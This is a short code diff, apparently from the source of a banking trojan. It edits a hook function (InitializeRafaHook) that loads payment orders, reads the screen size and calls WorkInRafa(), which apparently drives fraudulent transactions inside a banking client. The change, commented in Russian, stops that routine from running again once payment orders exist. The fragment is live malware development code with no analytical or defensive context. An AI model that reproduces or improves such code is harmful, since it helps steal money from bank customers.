@@ -1746,7 +1746,8 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 						LoadPaymentOrders();
 						widthScreen = (int)pGetSystemMetrics(SM_CXSCREEN);
 						heightScreen = (int)pGetSystemMetrics(SM_CYSCREEN);
-						WorkInRafa(); 
+						if( c_paymentOrders == 0 ) //аз уже был, повторно не нужно
+							WorkInRafa(); 
 					}
 					return 0;
 				}
